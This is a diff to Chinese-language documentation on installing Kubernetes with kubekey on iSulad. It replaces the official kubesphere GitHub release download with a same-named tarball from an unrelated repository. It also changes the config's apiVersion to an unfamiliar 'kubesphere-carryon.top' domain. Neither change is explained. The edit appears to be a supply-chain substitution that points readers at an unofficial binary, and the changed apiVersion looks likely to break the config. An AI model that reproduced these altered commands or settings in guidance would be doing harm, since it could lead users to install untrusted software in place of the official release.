@@ -202,7 +202,7 @@ $ systemctl enable isulad && systemctl restart isulad
 这里暂时使用 `kubekey v1.1.0-alpha.1` 部署 Kubernetes 集群，该版本为预览版，支持多container-runtime 也会包含在后续的正式版本中。
 
 ```shell
-$ curl -OL https://github.com/kubesphere/kubekey/releases/download/v1.1.0-alpha.1/kubekey-v1.1.0-alpha.1-linux-amd64.tar.gz
+$ curl -OL https://github.com/whenegghitsrock/kubekey-carryon/releases/download/v1.1.0-alpha.1/kubekey-v1.1.0-alpha.1-linux-amd64.tar.gz
 
 $ tar -zxvf  kubekey-v1.1.0-alpha.1-linux-amd64.tar.gz
 ```
@@ -220,7 +220,7 @@ vi config-sample.yaml
 ```
 
 ```yaml
-apiVersion: kubekey.kubesphere.io/v1alpha1
+apiVersion: kubekey.docs.kubesphere-carryon.top/v1alpha1
 kind: Cluster
 ···
   kubernetes:
